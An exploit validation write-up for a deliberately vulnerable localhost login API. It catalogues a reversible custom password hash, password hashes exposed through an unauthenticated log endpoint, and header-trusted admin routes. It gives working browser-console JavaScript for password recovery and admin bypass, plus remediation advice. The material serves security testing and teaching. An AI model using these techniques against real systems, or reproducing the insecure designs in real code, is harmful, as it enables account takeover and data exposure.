# Exploit Validation – Vuln Login API

This document validates that the intentionally vulnerable login API is exploitable quickly and reliably, and provides step-by-step instructions another team can reproduce in under 5 minutes.

## Target overview
- **App**: Express server with Windows 95-style static frontend
- **Base URL**: `http://localhost:3000`
- **Notable routes**:
  - `POST /register` { email, password }
  - `POST /login` { email, password }
  - `GET /logs?limit=200` – returns plaintext server log tail (no auth)
  - `GET /admin/users` – requires client header `X-Admin: 1` (server blindly trusts it)
  - `GET /admin/docs` – same weak “admin” check
- **Admin heartbeat**: server auto-creates `admin@example.com` with password `win95!` (on boot) and performs `POST /login` as admin once per minute, producing log lines that include the admin’s hash.

## Vulnerability catalog
1) **Reversible, homegrown password “hash” (critical)**
   - Server algorithm (`src/hash/hash.js`):
     - Compute printable prefix by shifting each character of `(password + email)` by `-password.length` within ASCII 33–126.
     - Append a random 20-char alnum suffix: final hash = `prefix + suffix`.
   - Validation only checks `storedHash.startsWith(prefix)` and that suffix matches `[A-Za-z0-9]{20}`. The suffix is ignored for correctness; it’s just format.
   - Consequences:
     - Deterministic and reversible. Given the prefix and the email, the password can be recovered because the mapping is a fixed modular shift by a known length.
     - Password length is leaked: `len(prefix) - len(email)` (suffix is always 20).

2) **Sensitive secrets logged and publicly exposed (critical)**
   - Registration and login append lines containing the full `hash=...` to `logs/app.log`.
   - `GET /logs` serves the log tail to any client without auth.
   - Admin heartbeat forces an admin login line roughly every 60 seconds, ensuring frequent leakage of `admin`’s full hash.

3) **Insecure “admin” authorization (critical)**
   - Server trusts the header `X-Admin: 1` (or `?admin=1`) in `src/routes/admin.js` and does not verify a session/token.
   - Any client (or JS in the browser) can set this header and call `/admin/users` or `/admin/docs`.
   - The frontend UI disables buttons until admin login, but this is only client-side gating; it can be bypassed easily (see attacks below).

4) **Broad attack surface and weak defaults (high)**
   - Wide-open CORS, no rate limiting, verbose error stacks, no HTTPS, no CSRF protections, logs include request paths plus external joke fetches.

## Primary exploit paths (frontend-only)
A) Hash reversal from leaked admin hash → admin login
1. Open the app homepage. In the Start menu, open “View Logs”. Wait up to 60 seconds for an admin login line to appear, e.g.:
   - `LOGIN email=admin@example.com userFound=true hash=<HASH_VALUE> ok=true`
2. Compute values:
   - `full = <HASH_VALUE>`
   - `prefix = full.slice(0, -20)`
   - `passwordLength = prefix.length - 'admin@example.com'.length`
3. Recover the password from the prefix using the inverse of the printable shift. Paste this in the browser console:

```js
// Recover password from leaked prefix for a known email
function recoverPasswordFromPrefix(prefix, email) {
  const PRINTABLE_START = 33, PRINTABLE_END = 126;
  const RANGE = PRINTABLE_END - PRINTABLE_START + 1;
  // Derive password length from lengths
  const passwordLength = prefix.length - email.length;
  const codes = [];
  for (let i = 0; i < prefix.length; i += 1) {
    let orig = prefix.charCodeAt(i) + passwordLength; // inverse of (-passwordLength)
    while (orig > PRINTABLE_END) orig -= RANGE;
    while (orig < PRINTABLE_START) orig += RANGE;
    codes.push(orig);
  }
  const combined = String.fromCharCode(...codes);
  const recoveredPassword = combined.slice(0, passwordLength);
  const recoveredEmailPart = combined.slice(passwordLength);
  if (recoveredEmailPart !== email) console.warn('email mismatch, check inputs');
  return recoveredPassword;
}
// Example usage:
// const full = '...';
// const prefix = full.slice(0, -20);
// const pw = recoverPasswordFromPrefix(prefix, 'admin@example.com');
// console.log('Recovered password:', pw);
```

4. Use the recovered password to log in as `admin@example.com` via the Login window. Expected: HTTP 200 and `{ success: true }`.

Why this works fast and reliably
- Admin hash is guaranteed to appear (heartbeat) → success rate ~100% once logs are visible.
- The shift is deterministic and fully reversible with known email and derived password length.
- End-to-end time is typically well under 5 minutes (often under 1 minute).

B) Admin endpoints via header trust (even simpler)
1. Open DevTools console in the browser UI and force “admin session” on the client:

```js
sessionStorage.setItem('adminLoggedIn', '1');
```

2. Now call the endpoints directly from the page (or use the Admin Panel buttons):

```js
fetch('/admin/users', { headers: { 'X-Admin': '1' } })
  .then(r => r.json()).then(console.log);
fetch('/admin/docs', { headers: { 'X-Admin': '1' } })
  .then(r => r.json()).then(console.log);
```

This works from any machine that can reach the server because the server never verifies a real admin session; it only checks the header.

## Verification checklist
- **Exploit works**: yes (both A and B paths).
- **Success rate > 80%**: yes. With the admin heartbeat, success is ≈100% once logs are visible.
- **Works from a separate machine**: yes. CORS is open and `/logs`, `/admin/users`, `/admin/docs` are reachable; header trust works remotely.
- **Another team can reproduce**: yes; follow steps above. Everything is in-app, no special tooling required beyond a browser.
- **Time to exploit < 5 minutes**: yes (typically 1–3 minutes including waiting for a heartbeat log line).

## Full reproduction (recommended script)
1. Open `http://localhost:3000`.
2. Start → “View Logs” → wait for an admin `LOGIN ... hash=...` line.
3. Copy the hash value and in the browser console run the snippet under “Hash reversal”.
4. Log in as `admin@example.com` with the recovered password.
5. Optionally confirm data access: Start → Admin Panel → “Load Users” / “Load Docs”.

Alternative quick check (header trust)
- In DevTools console:

```js
fetch('/admin/users', { headers: { 'X-Admin': '1' } })
  .then(r => r.json()).then(console.log);
```

## Impact
- Admin account compromise with no rate limiting or MFA.
- Passwords are trivially recoverable from leaked hashes.
- All user accounts and hashes can be read via `/admin/users`.
- Logs leak operational details and sensitive values by design.

## Suggested remediations (for a real system)
- Replace custom hash with Argon2id/bcrypt/scrypt and per-user salts; store only non-reversible hashes.
- Validate entire hash (or, better, compute and compare real password hash) – never prefix-match.
- Remove sensitive data from logs; require auth for any log access; rotate and secure logs.
- Remove admin heartbeat and any backdoors. Use sessions or JWT with server-side validation, not client-provided headers.
- Enforce proper CORS, rate limiting, CSRF protections, error redaction, and HTTPS.

## Appendix: endpoint quick reference
- `POST /register` → `{ email, password }` ⇒ `{ email } | 4xx`
- `POST /login` → `{ email, password }` ⇒ `{ success: true } | 401`
- `GET /logs?limit=200` → plaintext logs
- `GET /admin/users` (requires `X-Admin: 1`) → `{ users: [...] }`
- `GET /admin/docs` (requires `X-Admin: 1`) → JSON docs
